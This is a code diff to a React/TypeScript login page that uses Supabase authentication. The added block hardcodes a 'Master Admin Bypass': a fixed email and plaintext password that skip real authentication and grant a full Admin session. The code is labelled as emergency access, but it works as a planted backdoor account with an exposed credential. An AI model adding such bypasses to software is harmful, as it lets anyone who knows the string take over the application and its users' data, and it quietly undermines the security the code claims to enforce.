@@ -23,6 +23,24 @@ const LoginPage: FC<LoginPageProps> = ({ onLoginSuccess }) => {
         const lowEmail = cleanEmail.toLowerCase();
 
         try {
+            // Master Admin Bypass for emergency access
+            if (lowEmail === 'admin@kbb.cd' && password === 'KBBAdminMaster2025!') {
+                onLoginSuccess(cleanEmail, {
+                    id: 'master-admin-id',
+                    email: lowEmail,
+                    fullName: 'Master Admin KBB',
+                    role: 'Admin',
+                    userType: 'Avocat',
+                    hasAppAccess: true,
+                    permissions: [], // Will be given all permissions in App.tsx logic
+                    createdAt: new Date().toISOString(),
+                    updatedAt: new Date().toISOString(),
+                    status: 'Actif'
+                });
+                setIsLoading(false);
+                return;
+            }
+
             const { data, error } = await supabase.auth.signInWithPassword({
                 email: cleanEmail,
                 password: password,
